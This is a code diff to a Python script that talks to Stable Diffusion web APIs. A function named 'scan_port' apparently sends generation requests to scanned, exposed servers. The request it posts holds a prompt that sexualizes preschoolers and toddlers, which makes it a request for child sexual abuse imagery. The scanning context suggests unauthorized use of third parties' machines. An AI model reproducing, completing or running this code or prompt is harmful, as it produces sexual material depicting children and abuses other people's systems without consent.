@@ -30,9 +30,11 @@ def draw():
 
     opt_response = requests.get(url + "/sdapi/v1/options")
     opt_json = opt_response.json()
-    cur_model = opt_json["sd_model_checkpoint"]
+    if "sd_model_checkpoint" in opt_json:
+        cur_model = opt_json["sd_model_checkpoint"]
+    else:
+        cur_model = ""
     cur_hash = opt_json["sd_checkpoint_hash"][0:10]
-    cur_model_name = ""
     if "[" in cur_model and "]" in cur_model:
         cur_model_name = f"{cur_model}"
     else:
@@ -275,17 +277,17 @@ async def scan_port(session, item):
     try:
         headers = {"Content-Type": "application/json"}
         async with session.post(
-            api,
-            data=json.dumps(
-                {
-                    "n_iter": 1,
-                    "width": 512,
-                    "height": 768,
-                    "prompt": "best quality,masterpiece,(Preschooler:1.5),(toddler:1.5),(loli:1.5),(little loli:1.5),(Child:1.5),large_breasts,petite,skinny,ribs,black bodysuit,(see through:1.4),covered_nipples,covered_erect_nipples,covered_breasts,covered_navel,",
-                    "negative_prompt": "sketch,duplicate,ugly,text,error,logo,monochrome,worst face,(bad and mutated hands:1.3),(worst quality:1.3),(low quality:1.3),(normal quality:1.3),(blurry:1.3),(missing fingers),multiple limbs,bad anatomy,(interlocked fingers),Ugly Fingers,extra digit,extra hands,extra fingers,extra legs,extra arms,fewer digits,(deformed fingers),(long fingers),signature,watermark,username,multiple panels,",
-                }
-            ),
-            headers=headers,
+                api,
+                data=json.dumps(
+                    {
+                        "n_iter": 1,
+                        "width": 512,
+                        "height": 768,
+                        "prompt": "best quality,masterpiece,(Preschooler:1.5),(toddler:1.5),(loli:1.5),(little loli:1.5),(Child:1.5),(large_breasts:1.3),petite,skinny,ribs,black bodysuit,(see through:1.4),covered_nipples,covered_erect_nipples,covered_breasts,covered_navel,",
+                        "negative_prompt": "sketch,duplicate,ugly,text,error,logo,monochrome,worst face,(bad and mutated hands:1.3),(worst quality:1.3),(low quality:1.3),(normal quality:1.3),(blurry:1.3),(missing fingers),multiple limbs,bad anatomy,(interlocked fingers),Ugly Fingers,extra digit,extra hands,extra fingers,extra legs,extra arms,fewer digits,(deformed fingers),(long fingers),signature,watermark,username,multiple panels,",
+                    }
+                ),
+                headers=headers,
         ) as response:
             if 200 <= response.status < 300:
                 html_json = await response.json()
